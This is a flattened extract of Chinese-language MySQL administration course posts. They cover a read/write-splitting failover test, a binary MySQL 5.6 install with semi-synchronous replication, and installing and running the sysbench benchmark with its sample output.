id | name |+----+---------+| 1 | masterb |+----+---------+1 row in set (0.00 sec)***************************************#插入数据，查看插入到哪个服务器中了**************************************** MySQL [(none)]&gt; insert into db1.t1 values (2,&apos;test&apos;);Query OK, 1 row affected (0.04 sec)MySQL [(none)]&gt; select @@hostname;+----------------------+| @@hostname |+----------------------+| masterb0.example.com |+----------------------+1 row in set (0.00 sec)***************************************#将masterb0的服务关闭后，再插入数据# systemctl stop mysqld****************************************MySQL [(none)]&gt; insert into db1.t1 values (100,&apos;oo&apos;);ERROR 2013 (HY000): Lost connection to MySQL server during queryMySQL [(none)]&gt; select @@hostname;ERROR 2013 (HY000): Lost connection to MySQL server during queryMySQL [(none)]&gt; select @@hostname;ERROR 2006 (HY000): MySQL server has gone awayNo connection. Trying to reconnect...Connection id: 7Current database: *** NONE ***+---------------------+| @@hostname |+---------------------+| slavea0.example.com |+---------------------+1 row in set (0.01 sec)***************************************#将mastera0的服务启动后，再插入数据# systemctl start mysqld****************************************MySQL [(none)]&gt; begin;Query OK, 0 rows affected (0.00 sec)MySQL [(none)]&gt; select @@hostname;+----------------------+| @@hostname |+----------------------+| mastera0.example.com |+----------------------+1 row in set (0.00 sec)MySQL [(none)]&gt; insert into db1.t1 values (101,&apos;oo&apos;);Query OK, 1 row affected (0.00 sec)MySQL [(none)]&gt; commit;Query OK, 0 rows affected (0.07 sec)MySQL [(none)]&gt; select @@hostname;+---------------------+| @@hostname |+---------------------+| slavea0.example.com |+---------------------+1 row in set (0.00 sec)MySQL [(none)]&gt; select * from db1.t1;+----+--------+| id | name |+----+--------+| 1 | slavea |+----+--------+1 row in set (0.00 sec)***************************************#此时发现，写操作连接mastera，读操作连接slavea**************************************** 实战项目2：数据库中间件 mysql-proxy 0.8.5 实现 读写分离负载均衡，后端数据库服务器为 Mariadb 10.2 Galera Cluster 同步复制高可用架构 实战项目3: 数据库中间件 Mycat 实现 读写分离负载均衡，后端数据库服务器为 Mariadb 10.2 Galera Cluster 同步复制高可用架构 总结 Galera Cluster是MariaDB的一个双活多主集群,其可以使得MariDB的所有节点保持同步,Galera为MariaDB提供了同步复制(相对于原生的异步复制),因此其可以保证HA,且其当前仅支持XtraDB/InnoDB存储引擎(扩展支持MyISAM),并且只可在Linux下使用。 mariadb10.2的galera版本和之前版本有所区别，需要注意 mysql-proxy还没有正式版，问题比较多，安装需要源码编译，使用lua脚本实现读写分离； mycat是目前开源里面做的最好的数据库代理服务器，tar包解压到制定目录就能使用，但是注意需要安装jdk，并宣告java家目录的位置。","link":"/2017/01/02/booboo_mysql/05-MySQL-HA/"},{"title":"MySQL 管理课程 第十课 MySQL5.6一主多从半同步复制","text":"要求掌握mysql5.6的二进制安装和AB replication之半同步复制 role server ip master mastera 172.25.0.11 slave masterb 172.25.0.12 slave slavea 172.25.0.13 安装二进制的mysql5.612345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091[root@mastera0 ~]# tar -xf mysql-5.6.20-linux-glibc2.5-x86_64.tar.gz [root@mastera0 ~]# cd mysql-5.6.20-linux-glibc2.5-x86_64[root@mastera0 mysql-5.6.20-linux-glibc2.5-x86_64]# lsbin COPYING data docs include INSTALL-BINARY lib man mysql-test README scripts share sql-bench support-files[root@mastera0 mysql-5.6.20-linux-glibc2.5-x86_64]# cat INSTALL-BINARY... ... To install and use a MySQL binary distribution, the basic command sequence looks like this:shell&gt; groupadd mysqlshell&gt; useradd -r -g mysql mysqlshell&gt; cd /usr/localshell&gt; tar zxvf /path/to/mysql-VERSION-OS.tar.gzshell&gt; ln -s full-path-to-mysql-VERSION-OS mysqlshell&gt; cd mysqlshell&gt; chown -R mysql .shell&gt; chgrp -R mysql .shell&gt; scripts/mysql_install_db --user=mysqlshell&gt; chown -R root .shell&gt; chown -R mysql datashell&gt; bin/mysqld_safe --user=mysql &amp;# Next command is optionalshell&gt; cp support-files/mysql.server /etc/init.d/mysql.server... ...[root@mastera0 mysql-5.6.20-linux-glibc2.5-x86_64]# groupadd mysql[root@mastera0 mysql-5.6.20-linux-glibc2.5-x86_64]# cd ..[root@mastera0 ~]# useradd -r -g mysql mysql[root@mastera0 ~]# cd /usr/local[root@mastera0 local]# mv /root/mysql-5.6.20-linux-glibc2.5-x86_64 .[root@mastera0 local]# lsbin games lib libexec sbin srcetc include lib64 mysql-5.6.20-linux-glibc2.5-x86_64 share[root@mastera0 local]# ln -s mysql-5.6.20-linux-glibc2.5-x86_64 mysql[root@mastera0 local]# ll mysqllrwxrwxrwx. 1 root root 34 Dec 11 12:20 mysql -&gt; mysql-5.6.20-linux-glibc2.5-x86_64[root@mastera0 mysql]# cd mysql[root@mastera0 mysql]# mkdir /data/mysql/data -p[root@mastera0 mysql]# chown mysql. /data/mysql/data[root@mastera0 mysql]# chown mysql. /data/mysql/data -R[root@mastera0 mysql]# ll -d /data/mysql/datadrwxr-xr-x. 2 mysql mysql 4096 Dec 11 12:24 /data/mysql/data[root@mastera0 mysql]# scripts/mysql_install_db --user=mysql --datadir=/data/mysql/data --basedir=/usr/local/mysql[root@mastera0 mysql]# ll /data/mysql/datatotal 110604-rw-rw----. 1 mysql mysql 12582912 Dec 11 12:28 ibdata1-rw-rw----. 1 mysql mysql 50331648 Dec 11 12:28 ib_logfile0-rw-rw----. 1 mysql mysql 50331648 Dec 11 12:28 ib_logfile1drwx------. 2 mysql mysql 4096 Dec 11 12:28 mysqldrwx------. 2 mysql mysql 4096 Dec 11 12:28 performance_schemadrwx------. 2 mysql mysql 4096 Dec 11 12:28 test[root@mastera0 mysql]# cp /mnt/mysql/my.cnf /etc/my.cnf[root@mastera0 mysql]# vim /etc/my.cnf[client]#如果不认识这个参数会忽略loose-default-character-set=utf8loose-prompt=&apos;\\u@\\h:\\p [\\d]&gt;&apos;socket=/tmp/mysql.sock[mysqld]basedir = /usr/local/mysqldatadir = /data/mysql/datauser=mysqlport = 3306socket=/tmp/mysql.sockpid-file=/data/tmp/mysql.pidtmpdir=/data1/tmpcharacter_set_server=utf8#skipskip-external_locking=1skip-name-resolve=1#AB replicationserver-id = 1log-bin = /data/mysql/log-data/masterabinlog_format=rowmax_binlog_cache_size=2000Mmax_binlog_size=1Gsync_binlog=1#expire_logs_days=7#semi_syncrpl_semi_sync_master_enabled=1rpl_semi_sync_master_timeout=1000[root@mastera0 mysql]# pwd/usr/local/mysql[root@mastera0 mysql]# cp support-files/mysql.server /etc/init.d/mysql.server[root@mastera0 mysql]# echo export PATH=$PATH:/usr/local/mysql/support-files/ &gt;&gt; /etc/bashrc mysql 软件架构 数据目录 /data/mysql/data binlog目录 /data/mysql/log-data pid文件 /data/tmp 临时目录 /data1/tmp/ 以上目录所属者和所属组都需要为mysql.mysql 同样去安装masterb slavea 配置主从步骤忽略 配置主从半同步模式 安装半同步插件12&gt;install plugin rpl_semi_sync_master soname &apos;semisync_master.so&apos;;&gt;install plugin rpl_semi_sync_slave soname &apos;semisync_slave.so&apos;; 配置文件中需要打开相应的参数123rpl_semi_sync_master_enabled=1rpl_semi_sync_master_timeout=1000 #msrpl_semi_sync_slave_enabled=1 重新启动服务 测试 1234567891011121314151617181920212223242526272829303132333435363738394041masteraroot@localhost:mysql.sock [(none)]&gt;show variables like &quot;%semi%&quot;;+------------------------------------+-------+| Variable_name | Value |+------------------------------------+-------+| rpl_semi_sync_master_enabled | ON || rpl_semi_sync_master_timeout | 1000 || rpl_semi_sync_master_trace_level | 32 || rpl_semi_sync_master_wait_no_slave | ON || rpl_semi_sync_slave_enabled | OFF || rpl_semi_sync_slave_trace_level | 32 |+------------------------------------+-------+6 rows in set (0.00 sec)masterbroot@localhost:mysql.sock [(none)]&gt;show variables like &quot;%semi%&quot;;+------------------------------------+-------+| Variable_name | Value |+------------------------------------+-------+| rpl_semi_sync_master_enabled | OFF || rpl_semi_sync_master_timeout | 10000 || rpl_semi_sync_master_trace_level | 32 || rpl_semi_sync_master_wait_no_slave | ON || rpl_semi_sync_slave_enabled | ON || rpl_semi_sync_slave_trace_level | 32 |+------------------------------------+-------+6 rows in set (0.00 sec)slavearoot@localhost:mysql.sock [(none)]&gt;show variables like &quot;%semi%&quot;;+------------------------------------+-------+| Variable_name | Value |+------------------------------------+-------+| rpl_semi_sync_master_enabled | OFF || rpl_semi_sync_master_timeout | 10000 || rpl_semi_sync_master_trace_level | 32 || rpl_semi_sync_master_wait_no_slave | ON || rpl_semi_sync_slave_enabled | ON || rpl_semi_sync_slave_trace_level | 32 |+------------------------------------+-------+6 rows in set (0.00 sec) 现在将masterb和slavea的slave关闭，在mastera上进行写操作，并观察。 12345678root@localhost:mysql.sock [(none)]&gt;insert into db1.t1 values (2);Query OK, 1 row affected (1.29 sec)root@localhost:mysql.sock [(none)]&gt;insert into db1.t1 values (3);Query OK, 1 row affected (0.20 sec)root@localhost:mysql.sock [(none)]&gt;insert into db1.t1 values (4);Query OK, 1 row affected (0.22 sec) 当mastera等待1000ms也就是1s后，就不等了，所以看到消耗1.29s，而之后的插入就变成异步了。","link":"/2017/01/04/booboo_mysql/07-MySQL5.6-one-master-multi-slave-semi-synchronous-replication/"},{"title":"MySQL 管理课程 第九课 MySQL压力测试工具sysbench","text":"sysbench是一个模块化的、跨平台、多线程基准测试工具，主要用于评估测试各种不同系统参数下的数据库负载情况。 主要测试方式 cpu性能 磁盘io性能 调度程序性能 内存分配及传输速度 POSIX线程性能 数据库性能(OLTP基准测试) 找范围内最大素数{时间越短越好} 不同场景下IOPS{越大越好} 线程并发执行，循环响应信号量花费的时间{越少越好} 以不同块大小传输一定数量的数据吞吐量大小{越大越好} 并发线程同时申请互斥锁循环一定次数花费的时间{越少越好} qps、tps越高越好 目前sysbench主要支持 MySQL,pgsql,oracle 这3种数据库。 安装测试环境为：RHEL7.2 MariaDB5.5.44 安装sysbench-0.5源码地址https://github.com/BoobooWei/sysbench/archive/master.zip 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566[root@localhost ~]# unzip sysbench-master.zip[root@localhost ~]# cd sysbench-master/[root@localhost sysbench-master]# lsautogen.sh configure.ac doc Makefile.am README.md sysbench TODOChangeLog COPYING install-sh missing README-Oracle.md testsconfig debian m4 mkinstalldirs README-WIN.txt third_party[root@localhost sysbench-master]# yum install -y automake libtool[root@localhost sysbench-master]# ./autogen.sh ./autogen.sh: running `libtoolize --copy --force&apos; libtoolize: putting auxiliary files in AC_CONFIG_AUX_DIR, `config&apos;.libtoolize: copying file `config/ltmain.sh&apos;libtoolize: putting macros in AC_CONFIG_MACRO_DIR, `m4&apos;.此处省略... ...[root@localhost sysbench-master]# ./configure此处省略... ...===============================================================================sysbench version : 1.0CC : gccCFLAGS : -O2 -ggdb3 -march=core2 -W -Wall -Wextra -Wpointer-arith -Wbad-function-cast -Wstrict-prototypes -Wnested-externs -Wno-inline -Wno-format-zero-length -funroll-loops -Wundef -Wstrict-prototypes -Wmissing-prototypes -Wmissing-declarations -Wredundant-decls -Wcast-align -pthreadCPPFLAGS : -D_GNU_SOURCE -I$(top_srcdir)/sysbench -I$(abs_top_builddir)/third_party/luajit/inc -I$(abs_top_builddir)/third_party/concurrency_kit/includeLDFLAGS : LIBS : -lm EXTRA_LDFLAGS : prefix : /usr/local/sysbenchbindir : ${prefix}/binlibexecdir : ${prefix}/libexecmandir : ${prefix}/share/manMySQL support : yesDrizzle support : noAttachSQL support : noOracle support : noPostgreSQL support : noLuaJIT : bundledLUAJIT_CFLAGS : -I$(abs_top_builddir)/third_party/luajit/incLUAJIT_LIBS : $(abs_top_builddir)/third_party/luajit/lib/libluajit-5.1.a -ldlLUAJIT_LDFLAGS : -rdynamicConcurrency Kit : bundledCK_CFLAGS : -I$(abs_top_builddir)/third_party/concurrency_kit/includeCK_LIBS : $(abs_top_builddir)/third_party/concurrency_kit/lib/libck.aconfigure flags : ===============================================================================[root@localhost sysbench-master]# make[root@localhost sysbench-master]# make install[root@localhost sysbench-master]# cd /usr/local/sysbench[root@localhost sysbench]# pwd/usr/local/sysbench[root@localhost sysbench]# lsbin share[root@localhost sysbench]# echo export PATH=$PATH:/usr/local/sysbench/bin &gt;&gt; /etc/bashrc[root@localhost sysbench]# source /etc/bashrc[root@localhost sysbench]# which sysbench/usr/local/sysbench/bin/sysbench# 测试的lua脚本存放位置[root@localhost sysbench]# ls /root/sysbench-master/sysbench/tests/CMakeLists.txt db Makefile Makefile.in mutex sb_fileio.h sb_mutex.h threadscpu fileio Makefile.am memory sb_cpu.h sb_memory.h sb_threads.h[root@localhost sysbench]# ls /root/sysbench-master/sysbench/tests/dbbulk_insert.lua insert.lua Makefile.in parallel_prepare.lua select_random_ranges.luacommon.lua Makefile oltp.lua select.lua update_index.luadelete.lua Makefile.am oltp_simple.lua select_random_points.lua update_non_index.lua 测试MySQL数据库测试sysbench 0.5通过一系列LUA脚本来替换之前的oltp，来模拟更接近真实的基准测试环境。这些测试脚本包含：insert.lua、oltp.lua、parallel_prepare.lua、select_random_points.lua、update_index.lua、delete.luaoltp_simple.lua、select.lua、select_random_ranges.lua、update_non_index.lua，脚本使用方式基本类似。 sysbench 0.5默认使用sbtest库，但是需要自己手工先创建好，也可以使用–mysql-db指定，其他非默认项指定选项： –mysql-host –mysql-port –mysql-socket –mysql-user –mysql-password –mysql-db –mysql-ssl prepare 生成表并插入数据，可使用parallel_prepare.lua脚本来并行准备数据。 -–db-driver 服务器类型 mysql | drizzle,默认为mysql -–mysql-table-engine 表存数引擎 -–myisam-max-rows MyISAM表MAX_ROWS选项(用于大表) –-oltp-table-count 生成表数量[sbtest1、sbtest2…] -–oltp-table-size 生成表的行数 -–oltp-secondary ID列生成二级索引而不是主键 –-oltp-auto-inc设置ID列是否自增 on | off，默认为on –oltp-read-only=on –test=sysbench-0.5/sysbench/tests目录下测试脚本 123456789101112131415sysbench \\ --test=/root/sysbench-master/sysbench/tests/db/oltp.lua \\ --mysql-host=localhost \\ --mysql-port=3306 \\ --mysql-user=root \\ --mysql-password=uplooking \\ --oltp-table-size=100000 \\ --num-threads=8 \\ --max-time=10 \\ --mysql-db=sbtest \\ --max-requests=0 \\ --oltp-test-mode=complex \\ --report-interval=1 \\ --mysql-table-engine=innodb \\ [prepare|run|cleanup]准备/测试/清除 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121[root@localhost sysbench]# sysbench --test=/root/sysbench-master/sysbench/tests/db/oltp.lua --mysql-host=localhost --mysql-port=3306 --mysql-user=root --mysql-password=uplooking --oltp-table-size=10000 --num-threads=8 --max-time=10 --mysql-db=sbtest --max-requests=0 --oltp-test-mode=complex --report-interval=1 --mysql-table-engine=innodb preparesysbench 1.0 (using bundled LuaJIT 2.1.0-beta2)Creating table &apos;sbtest1&apos;...Inserting 10000 records into &apos;sbtest1&apos;Creating secondary indexes on &apos;sbtest1&apos;...[root@localhost sysbench]# sysbench --test=/root/sysbench-master/sysbench/tests/db/oltp.lua --mysql-host=localhost --mysql-port=3306 --mysql-user=root --mysql-password=uplooking --oltp-table-size=10000 --num-threads=8 --max-time=10 --mysql-db=sbtest --max-requests=0 --oltp-test-mode=complex --report-interval=1 --mysql-table-engine=innodb runsysbench 1.0 (using bundled LuaJIT 2.1.0-beta2)Running the test with following options:Number of threads: 8Report intermediate results every 1 second(s)Initializing random number generator from current timeInitializing worker threads...Threads started![ 1s] threads: 8, tps: 39.71, reads: 639.17, writes: 162.63, response time: 363.18ms (95%), errors: 0.00, reconnects: 0.00[ 2s] threads: 8, tps: 45.45, reads: 626.37, writes: 185.74, response time: 376.49ms (95%), errors: 0.00, reconnects: 0.00[ 3s] threads: 8, tps: 53.32, reads: 733.18, writes: 214.31, response time: 272.27ms (95%), errors: 0.00, reconnects: 0.00[ 4s] threads: 8, tps: 43.35, reads: 641.97, writes: 176.17, response time: 356.70ms (95%), errors: 0.00, reconnects: 0.00[ 5s] threads: 8, tps: 36.87, reads: 501.05, writes: 160.51, response time: 458.96ms (95%), errors: 0.00, reconnects: 0.00[ 6s] threads: 8, tps: 35.18, reads: 513.58, writes: 141.71, response time: 397.39ms (95%), errors: 0.00, reconnects: 0.00[ 7s] threads: 8, tps: 40.06, reads: 545.80, writes: 147.22, response time: 520.62ms (95%), errors: 0.00, reconnects: 0.00[ 8s] threads: 8, tps: 54.99, reads: 763.82, writes: 216.95, response time: 240.02ms (95%), errors: 0.00, reconnects: 0.00[ 9s] threads: 8, tps: 41.37, reads: 577.26, writes: 176.06, response time: 331.91ms (95%), errors: 0.00, reconnects: 0.00[ 10s] threads: 7, tps: 57.49, reads: 807.87, writes: 217.62, response time: 240.02ms (95%), errors: 0.00, reconnects: 0.00OLTP test statistics: queries performed: read: 6398 write: 1828 other: 914 total: 9140 transactions: 457 (44.97 per sec.) read/write requests: 8226 (809.37 per sec.) other operations: 914 (89.93 per sec.) ignored errors: 0 (0.00 per sec.) reconnects: 0 (0.00 per sec.)General statistics: total time: 10.1917s total number of events: 457 total time taken by event execution: 80.3041sLatency statistics: min: 22.82ms avg: 175.72ms max: 563.77ms approx. 95th percentile: 376.49msThreads fairness: events (avg/stddev): 57.1250/2.93 execution time (avg/stddev): 10.0380/0.07# 我的机器是6G内存，2个cpu，单核，超多线程碾压的时候试一试64和128个线程[root@localhost sysbench]# sysbench --test=/root/sysbench-master/sysbench/tests/db/oltp.lua --mysql-host=localhost --mysql-port=3306 --mysql-user=root --mysql-password=uplooking --oltp-table-size=10000 --num-threads=64 --max-time=30 --mysql-db=sbtest --max-requests=0 --oltp-test-mode=complex --report-interval=1 --mysql-table-engine=innodb runsysbench 1.0 (using bundled LuaJIT 2.1.0-beta2)OLTP test statistics: queries performed: read: 21210 write: 6007 other: 3008 total: 30225 transactions: 1493 (49.07 per sec.) read/write requests: 27217 (894.57 per sec.) other operations: 3008 (98.87 per sec.) ignored errors: 22 (0.72 per sec.) reconnects: 0 (0.00 per sec.)General statistics: total time: 30.6492s total number of events: 1493 total time taken by event execution: 1445.1459sLatency statistics: min: 35.38ms avg: 967.95ms max: 4147.00ms approx. 95th percentile: 2238.47msThreads fairness: events (avg/stddev): 23.3281/12.34 execution time (avg/stddev): 22.5804/11.02[root@localhost sysbench]# sysbench --test=/root/sysbench-master/sysbench/tests/db/oltp.lua --mysql-host=localhost --mysql-port=3306 --mysql-user=root --mysql-password=uplooking --oltp-table-size=10000 --num-threads=128 --max-time=60 --mysql-db=sbtest --max-requests=0 --oltp-test-mode=complex --report-interval=1 --mysql-table-engine=innodb run OLTP test statistics: queries performed: read: 58086 write: 16337 other: 8198 total: 82621 transactions: 4049 (67.05 per sec.) read/write requests: 74423 (1232.47 per sec.) other operations: 8198 (135.76 per sec.) ignored errors: 100 (1.66 per sec.) reconnects: 0 (0.00 per sec.)General statistics: total time: 60.7499s total number of events: 4049 total time taken by event execution: 2685.2741sLatency statistics: min: 15.82ms avg: 663.19ms max: 8312.00ms approx. 95th percentile: 1973.38msThreads fairness: events (avg/stddev): 31.6328/45.46 execution time (avg/stddev): 20.9787/22.98[root@localhost sysbench]# sysbench --test=/root/sysbench-master/sysbench/tests/db/oltp.lua --mysql-host=localhost --mysql-port=3306 --mysql-user=root --mysql-password=uplooking --oltp-table-size=10000 --num-threads=128 --max-time=60 --mysql-db=sbtest --max-requests=0 --oltp-test-mode=complex --report-interval=1 --mysql-table-engine=innodb cleanupsysbench 1.0 (using bundled LuaJIT 2.1.0-beta2)Dropping table &apos;sbtest1&apos;... 如果是多表呢并增加表的大小，情况又会如何呢？ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293[root@localhost sysbench]# sysbench --test=/root/sysbench-master/sysbench/tests/db/oltp.lua --mysql-host=localhost --mysql-port=3306 --mysql-user=root --mysql-password=uplooking --oltp-tables-count=10 --oltp-table-size=100000 --num-threads=128 --max-time=60 --mysql-db=sbtest --max-requests=0 --oltp-test-mode=complex --report-interval=1 --mysql-table-engine=innodb preparesysbench 1.0 (using bundled LuaJIT 2.1.0-beta2)Creating table &apos;sbtest1&apos;...Inserting 100000 records into &apos;sbtest1&apos;Creating secondary indexes on &apos;sbtest1&apos;...Creating table &apos;sbtest2&apos;...Inserting 100000 records into &apos;sbtest2&apos;Creating secondary indexes on &apos;sbtest2&apos;...Creating table &apos;sbtest3&apos;...Inserting 100000 records into &apos;sbtest3&apos;Creating secondary indexes on &apos;sbtest3&apos;...Creating table &apos;sbtest4&apos;...Inserting 100000 records into &apos;sbtest4&apos;Creating secondary indexes on &apos;sbtest4&apos;...Creating table &apos;sbtest5&apos;...Inserting 100000 records into &apos;sbtest5&apos;Creating secondary indexes on &apos;sbtest5&apos;...Creating table &apos;sbtest6&apos;...Inserting 100000 records into &apos;sbtest6&apos;Creating secondary indexes on &apos;sbtest6&apos;...Creating table &apos;sbtest7&apos;...Inserting 100000 records into &apos;sbtest7&apos;Creating secondary indexes on &apos;sbtest7&apos;...Creating table &apos;sbtest8&apos;...Inserting 100000 records into &apos;sbtest8&apos;Creating secondary indexes on &apos;sbtest8&apos;...Creating table &apos;sbtest9&apos;...Inserting 100000 records into &apos;sbtest9&apos;Creating secondary indexes on &apos;sbtest9&apos;...Creating table &apos;sbtest10&apos;...Inserting 100000 records into &apos;sbtest10&apos;Creating secondary indexes on &apos;sbtest10&apos;...[root@localhost sysbench]# sysbench --test=/root/sysbench-master/sysbench/tests/db/oltp.lua --mysql-host=localhost --mysql-port=3306 --mysql-user=root --mysql-password=uplooking --oltp-tables-count=10 --oltp-table-size=100000 --num-threads=130 --max-time=20 --mysql-db=sbtest --max-requests=0 --oltp-test-mode=complex --report-interval=1 --mysql-table-engine=innodb run sysbench 1.0 (using bundled LuaJIT 2.1.0-beta2)Running the test with following options:Number of threads: 130Report intermediate results every 1 second(s)Initializing random number generator from current timeInitializing worker threads...Threads started![ 1s] threads: 130, tps: 0.99, reads: 1259.55, writes: 11.93, response time: 87.56ms (95%), errors: 0.00, reconnects: 0.00[ 2s] threads: 130, tps: 14.04, reads: 619.78, writes: 242.70, response time: 1903.57ms (95%), errors: 0.00, reconnects: 0.00[ 3s] threads: 130, tps: 66.22, reads: 547.33, writes: 261.00, response time: 2880.27ms (95%), errors: 0.00, reconnects: 0.00[ 4s] threads: 130, tps: 19.21, reads: 366.95, writes: 62.68, response time: 3911.79ms (95%), errors: 0.00, reconnects: 0.00[ 5s] threads: 130, tps: 45.63, reads: 876.69, writes: 120.39, response time: 4517.90ms (95%), errors: 0.00, reconnects: 0.00[ 6s] threads: 130, tps: 38.79, reads: 653.12, writes: 183.46, response time: 5312.73ms (95%), errors: 0.00, reconnects: 0.00[ 7s] threads: 130, tps: 109.66, reads: 833.38, writes: 366.85, response time: 3982.86ms (95%), errors: 0.00, reconnects: 0.00[ 8s] threads: 130, tps: 9.94, reads: 611.61, writes: 17.90, response time: 4683.57ms (95%), errors: 0.00, reconnects: 0.00[ 9s] threads: 130, tps: 4.04, reads: 227.04, writes: 74.67, response time: 4358.09ms (95%), errors: 0.00, reconnects: 0.00[ 10s] threads: 130, tps: 108.98, reads: 813.88, writes: 425.94, response time: 3574.99ms (95%), errors: 0.00, reconnects: 0.00[ 11s] threads: 130, tps: 21.48, reads: 660.03, writes: 24.41, response time: 3773.42ms (95%), errors: 0.00, reconnects: 0.00[ 12s] threads: 130, tps: 41.65, reads: 512.63, writes: 221.12, response time: 3982.86ms (95%), errors: 0.00, reconnects: 0.00[ 13s] threads: 130, tps: 40.33, reads: 623.56, writes: 256.46, response time: 3267.19ms (95%), errors: 0.00, reconnects: 0.00[ 14s] threads: 130, tps: 39.68, reads: 460.24, writes: 76.38, response time: 3841.98ms (95%), errors: 0.00, reconnects: 0.00[ 15s] threads: 130, tps: 37.63, reads: 691.16, writes: 215.86, response time: 4517.90ms (95%), errors: 0.00, reconnects: 0.00[ 16s] threads: 130, tps: 53.97, reads: 704.44, writes: 166.64, response time: 4055.23ms (95%), errors: 0.00, reconnects: 0.00[ 17s] threads: 130, tps: 22.56, reads: 305.12, writes: 166.53, response time: 4855.31ms (95%), errors: 0.00, reconnects: 0.00[ 18s] threads: 130, tps: 1.00, reads: 320.21, writes: 36.14, response time: 4943.53ms (95%), errors: 0.00, reconnects: 0.00[ 19s] threads: 130, tps: 82.52, reads: 854.02, writes: 259.49, response time: 6026.41ms (95%), errors: 0.00, reconnects: 0.00[ 20s] threads: 130, tps: 11.85, reads: 332.75, writes: 12.84, response time: 4517.90ms (95%), errors: 0.00, reconnects: 0.00[ 21s] threads: 130, tps: 52.01, reads: 332.47, writes: 383.46, response time: 5124.81ms (95%), errors: 0.00, reconnects: 0.00OLTP test statistics: queries performed: read: 12656 write: 3616 other: 1808 total: 18080 transactions: 904 (42.53 per sec.) read/write requests: 16272 (765.60 per sec.) other operations: 1808 (85.07 per sec.) ignored errors: 0 (0.00 per sec.) reconnects: 0 (0.00 per sec.)General statistics: total time: 21.5991s total number of events: 904 total time taken by event execution: 2713.1958sLatency statistics: min: 87.55ms avg: 3001.32ms max: 6827.14ms approx. 95th percentile: 4855.31msThreads fairness: events (avg/stddev): 6.9538/0.78 execution time (avg/stddev): 20.8707/0.35 CPU测试 使用64位整数，测试计算素数直到某个最大值所需要的时间 sysbench --test=cpu --cpu-max-prime=2000 run 查看CPU信息方法,查看物理cpu个数 grep &quot;physical id&quot; /proc/cpuinfo | sort -u | wc -l 查看核心数量 grep &quot;core id&quot; /proc/cpuinfo | sort -u | wc -l 查看线程数量 grep &quot;processor&quot; /proc/cpuinfo | sort -u | wc -l 在sysbench的测试中，–num-threads取值为”线程数量”即可 线程(thread)测试 测试线程调度器的性能。对于高负载情况下测试线程调度器的行为非常有用 sysbench --test=threads --num-threads=64 --thread-yields=100 --thread-locks=2 run 文件IO性能测试 生成需要的测试文件，文件总大小5G，16个并发线程。执行完后会在当前目录下生成一堆小文件 sysbench --test=fileio --num-threads=16 --file-total-size=5G prepare 执行测试，指定随机读写模式: seqwr顺序写入 seqrewr顺序重写 seqrd顺序读取 rndrd随机读取 rndwr随机写入 rndrw混合随机读/写 sysbench --test=fileio --num-threads=16 --init-rng=on --file-total-size=5G --file-test-mode=rndrw run 除测试文件 sysbench --test=fileio --num-threads=16 --file-total-size=5G cleanup 内存测试 内存测试测试了内存的连续读写性能。 sysbench --test=memory --num-threads=16 --memory-block-size=8192 --memory-total-size=1G run 互斥锁(Mutex)测试 测试互斥锁的性能，方式是模拟所有线程在同一时刻并发运行，并都短暂请求互斥锁X。 sysbench --test=mutex --num-threads=16 --mutex-num=1024 --mutex-locks=10000 --mutex-loops=5000 run 安装sysbench-0.4源码在线下载地址：http://101.96.10.46/downloads.mysql.com/source/sysbench-0.4.12.10.tar.gz rpm包下线下载地址：http://rpm.pbone.net/index.php3/stat/4/idpl/31446291/dir/centos_7/com/sysbench-0.4.12-12.el7.x86_64.rpm.html 源码步骤数据库rpm包安装则直接编译如果数据库是rpm包安装则直接执行以下步骤，否则在configure的时候需要指定mysql数据库的库libs和includes路径 tar zxf sysbench-0.4.8.tar.gz cd sysbench-0.4.8 ./configure &amp;&amp; make &amp;&amp; make install strip /usr/local/bin/sysbench 数据库为源码编译数据库源码编译后路径如下： 数据目录 /usr/local/mysql includes目录 /usr/local/mysql/include libs目录 /usr/local/mysql/lib 执行以下步骤： tar zxf sysbench-0.4.8.tar.gz cd sysbench-0.4.8 ./configure –with-mysql-includes=/usr/local/mysql/include –with-mysql-libs=/usr/local/mysql/lib &amp;&amp; make &amp;&amp; make install strip /usr/local/bin/sysbench rpm包安装步骤依赖包： mariadb-devel-5.5.44-2.el7.x86_64 postgresql-libs.x86_64 0:9.2.13-1.el7_1​123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354[root@localhost ~]# rpm -q mariadb-develmariadb-devel-5.5.44-2.el7.x86_64[root@localhost ~]# [root@localhost ~]# rpm -ivh sysbench-0.4.12-12.el7.x86_64.rpm warning: sysbench-0.4.12-12.el7.x86_64.rpm: Header V4 RSA/SHA1 Signature, key ID 764429e6: NOKEYerror: Failed dependencies: libpq.so.5()(64bit) is needed by sysbench-0.4.12-12.el7.x86_64[root@localhost ~]# yum localinstall -y sysbench-0.4.12-12.el7.x86_64.rpm Loaded plugins: langpacks, product-id, search-disabled-repos, subscription-managerThis system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.Examining sysbench-0.4.12-12.el7.x86_64.rpm: sysbench-0.4.12-12.el7.x86_64Marking sysbench-0.4.12-12.el7.x86_64.rpm to be installedResolving Dependencies--&gt; Running transaction check---&gt; Package sysbench.x86_64 0:0.4.12-12.el7 will be installed--&gt; Processing Dependency: libpq.so.5()(64bit) for package: sysbench-0.4.12-12.el7.x86_64--&gt; Running transaction check---&gt; Package postgresql-libs.x86_64 0:9.2.13-1.el7_1 will be installed--&gt; Finished Dependency ResolutionDependencies Resolved===================================================================================================================================== Package Arch Version Repository Size=====================================================================================================================================Installing: sysbench x86_64 0.4.12-12.el7 /sysbench-0.4.12-12.el7.x86_64 172 kInstalling for dependencies: postgresql-libs x86_64 9.2.13-1.el7_1 _mnt 230 kTransaction Summary=====================================================================================================================================Install 1 Package (+1 Dependent package)Total size: 402 kTotal download size: 230 kInstalled size: 836 kDownloading packages:Running transaction checkRunning transaction testTransaction test succeededRunning transaction Installing : postgresql-libs-9.2.13-1.el7_1.x86_64 1/2 Installing : sysbench-0.4.12-12.el7.x86_64 2/2 Verifying : sysbench-0.4.12-12.el7.x86_64 1/2 Verifying : postgresql-libs-9.2.13-1.el7_1.x86_64 2/2 Installed: sysbench.x86_64 0:0.4.12-12.el7 Dependency Installed: postgresql-libs.x86_64 0:9.2.13-1.el7_1 Complete! 